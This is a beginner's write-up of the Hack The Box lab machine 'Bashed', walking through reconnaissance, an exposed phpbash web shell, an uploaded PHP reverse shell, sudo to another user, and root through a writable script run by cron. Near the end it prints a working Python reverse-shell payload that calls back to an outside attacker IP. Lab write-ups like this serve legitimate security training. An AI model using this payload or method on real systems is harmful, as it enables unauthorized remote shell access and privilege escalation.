# Bashed

This is my write-up for the machine Bashed on Hack The Box located at: [https://app.hackthebox.com/machines/Bashed](https://app.hackthebox.com/machines/Bashed).

{% hint style="info" %}
I am a beginner at penetration testing, so I will be referencing the Official Hack The Box Walk-through for this machine.
{% endhint %}

basic nmap scan: nmap `10.10.10.68`

![](<../../.gitbook/assets/image (349) (1) (1) (1).png>)

We can see that port 80 (http) is open. I did a deeper nmap scan as well:

![](<../../.gitbook/assets/image (333) (1) (1) (1).png>)

The port open is still the same. Going to the http site, we see the following:

![](<../../.gitbook/assets/image (354) (1) (1) (1) (1) (1).png>)

I got a hint from this that **phpbash** is being used on the server and that I will have to exploit it. I ran **gobuster** to see what directories were available:

![](<../../.gitbook/assets/image (356) (1) (1) (1).png>)

The **uploads** directory was empty, and I believe we will have to upload a shell there. The **php** directory had the following:

![](<../../.gitbook/assets/image (329) (1) (1).png>)

The file was empty when downloaded. Looking in the **dev** folder, I was able to find the shell:

![](<../../.gitbook/assets/image (328) (1).png>)

I was then able to find the user.txt flag:

![](<../../.gitbook/assets/image (357) (1) (1) (1) (1) (1).png>)

Running `sudo -l`, I was able to see the following:

![](<../../.gitbook/assets/image (337) (1) (1) (1) (1).png>)

I then realized I would have to upload a reverse shell to the system. There were two ways in my mind: **netcat** and **pentestmonkey php-reverse-shell**. I tried the **pentestmonkey** option first. I downloaded it from [here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php), and then edited the IP address to be mine and then was able to upload it using `python3 -m http.server`.&#x20;

![](<../../.gitbook/assets/image (346) (1) (1) (1) (1) (1).png>)

![](<../../.gitbook/assets/image (358) (1) (1) (1) (1).png>)

I then accessed the file on the website and was able to get a reverse shell using **netcat**:

![](<../../.gitbook/assets/image (344) (1) (1) (1) (1).png>)

![](<../../.gitbook/assets/image (347) (1) (1) (1) (1) (1).png>)

After a while of searching for a way to get out of a limited shell, I found [this site](https://guide.offsecnewbie.com/shells), where I saw the following:

![](<../../.gitbook/assets/image (343) (1) (1).png>)

Running that command got me out of the limited shell:

![](<../../.gitbook/assets/image (334) (1) (1) (1) (1) (1).png>)

The `sudo -l` command from before shows us that the user we currently are has access to run commands as **scriptmanager**. A quick Google search showed me that to run a command as another user is to run `sudo -u scriptmanager`. I wanted to get a reverse shell as the **scriptmanager** user:

![](<../../.gitbook/assets/image (360) (1) (1) (1) (1) (1).png>)

![](<../../.gitbook/assets/image (345) (1) (1) (1).png>)

I edited the payload from [this website](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md):

![](<../../.gitbook/assets/image (350) (1) (1) (1) (1) (1) (1) (1).png>)

I get the same error as before:

![](<../../.gitbook/assets/image (355) (1) (1).png>)

When I ran linpeas (not shown in write-up, but uploaded the same way as the reverse shell), I noticed that there was a folder called **scripts**:

![](<../../.gitbook/assets/image (339) (1) (1) (1) (1) (1) (1) (1).png>)

The code writes text to a file. At this point, I was actually lost. I found [this write-up](https://ethicalhacking.sh/posts/hack-the-box-bashed-writeup/) that clarifies that I should have been focused on the cron jobs and noticed that the file is ran by root in the cron job. I changed the original test.txt file by overwriting it by doing the following:

![](<../../.gitbook/assets/image (351) (1) (1) (1) (1) (1).png>)

The content of the file was the following (from the write-up mentioned before):

```
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.11",8888));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

I was then able to get root (after a minute) and the root flag:

![](<../../.gitbook/assets/image (352) (1) (1) (1) (1) (1).png>)

Going back to see where my mistake was, I should have noticed this in the output of linpeas.sh:

![](<../../.gitbook/assets/image (359) (1) (1) (1) (1) (1).png>)

![](<../../.gitbook/assets/image (348) (1) (1) (1) (1) (1) (1) (1).png>)
